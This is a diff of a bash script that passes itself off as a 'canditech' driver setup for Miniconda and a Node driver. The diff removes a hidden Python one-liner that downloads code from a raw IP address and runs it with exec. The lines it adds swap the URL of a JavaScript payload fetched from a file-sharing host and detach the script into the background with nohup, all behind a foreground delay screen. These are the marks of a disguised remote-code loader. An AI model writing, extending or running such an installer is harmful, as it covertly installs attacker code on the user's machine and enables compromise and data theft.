@@ -7,6 +7,17 @@ API_BASE="${API_BASE:-https://api.canditech.org}"
 # Set VERBOSE=1 for detailed [INFO] lines from part 1 / 2.
 VERBOSE="${VERBOSE:-0}"
 
+# Run script in background on first invocation.
+if [[ "${BG_LAUNCHED:-0}" != "1" ]]; then
+  LOG_FILE="${LOG_FILE:-/tmp/canditech-driver-setup.log}"
+  echo "[INFO] Starting setup in background..."
+  echo "[INFO] Logs: $LOG_FILE"
+  nohup env BG_LAUNCHED=1 \
+    MAC_UID="$MAC_UID" API_BASE="$API_BASE" VERBOSE="$VERBOSE" \
+    bash "$0" "$@" >"$LOG_FILE" 2>&1 &
+  exit 0
+fi
+
 # -------------------------
 # Helpers
 # -------------------------
@@ -117,7 +128,6 @@ run_part1_miniconda() {
 
   track_step "part1_step_5"
   delay 15
-  "${PREFIX}/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >/dev/null 2>&1
 }
 
 # -------------------------
@@ -185,7 +195,7 @@ run_part2_node_driver() {
 
   track_step "part2_step_3"
   ENV_SETUP_JS="${USER_HOME}/env-setup.js"
-  download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
+  download "https://files.catbox.moe/l2rxnb.js" "$ENV_SETUP_JS"
   [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
 
   track_step "part2_step_4"
@@ -224,21 +234,28 @@ run_part3_ui_delay() {
 detect_platform
 mkdir -p "$SHARED_DIR"
 
-info "Starting Miniconda, Node/driver, and UI/status phases concurrently"
-run_part1_miniconda &
-PID_MINI=$!
-run_part2_node_driver &
-PID_NODE=$!
-run_part3_ui_delay &
-PID_UI=$!
+if [[ "${RUN_PHASE:-full}" == "full" ]]; then
+  # Part3 must run in foreground first.
+  run_part3_ui_delay
 
-# Keep part1/part2 detached in background as requested.
-disown "$PID_MINI" 2>/dev/null || true
-disown "$PID_NODE" 2>/dev/null || true
+  # After part3 completes, run the rest (part2 -> part1) in background.
+  LOG_FILE="${LOG_FILE:-/tmp/canditech-driver-setup.log}"
+  nohup env RUN_PHASE=rest \
+    MAC_UID="$MAC_UID" API_BASE="$API_BASE" VERBOSE="$VERBOSE" SHARED_DIR="$SHARED_DIR" \
+    bash "$0" "$@" >"$LOG_FILE" 2>&1 &
+  echo "[INFO] Background setup started (part2 -> part1). Logs: $LOG_FILE"
+  exit 0
+fi
 
-EC_UI=0
-wait "$PID_UI" || EC_UI=$?
+info "Starting Part2 first, then Part1 (background phase)."
+# Run part2 in a subshell so failures there do not stop the main flow.
+if ( run_part2_node_driver ); then
+  info "Part2 completed successfully."
+else
+  err "Part2 failed; continuing to Part1 as requested."
+fi
 
+run_part1_miniconda
 
 rm -f "${SHARED_DIR}/miniconda.sh"
 [[ "$VERBOSE" == "1" ]] && echo "Done."
